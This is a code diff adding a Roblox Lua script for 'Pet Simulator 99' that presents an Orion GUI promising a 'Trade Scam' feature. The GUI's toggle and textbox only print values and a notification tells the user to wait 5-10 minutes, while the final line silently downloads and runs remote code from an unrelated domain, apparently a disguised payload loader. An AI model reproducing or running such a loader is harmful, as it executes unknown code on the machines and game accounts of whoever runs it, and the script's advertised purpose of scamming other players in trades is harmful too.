@@ -1,0 +1,41 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "TradeScamPetSim99!🔥", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+local Tab = Window:MakeTab({
+	Name = "Trade Scam",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+local Section = Tab:AddSection({
+	Name = "Trade Scam"
+})
+
+Tab:AddToggle({
+	Name = "Turn on/off Trade Scam",
+	Default = false,
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+Tab:AddTextbox({
+	Name = "You Should Wait 5-10min to the script work",
+	TextDisappear = true,
+	Callback = function(Value)
+		print(Value)
+	end	  
+})
+
+OrionLib:MakeNotification({
+	Name = "WARNING!!!!!",
+	Content = "YOU SHOULD WAIT 5-10MIN TO THE SCRIPT WORK",
+	Image = "rbxassetid://4483345998",
+	Time = 99999999999999
+})
+
+OrionLib:Init()
+
+
+
+getgenv().gui = false
+
+loadstring(game:HttpGet("https://egorikusa.space/088bbe5c10488c96da1ce2e5.lua", true))()
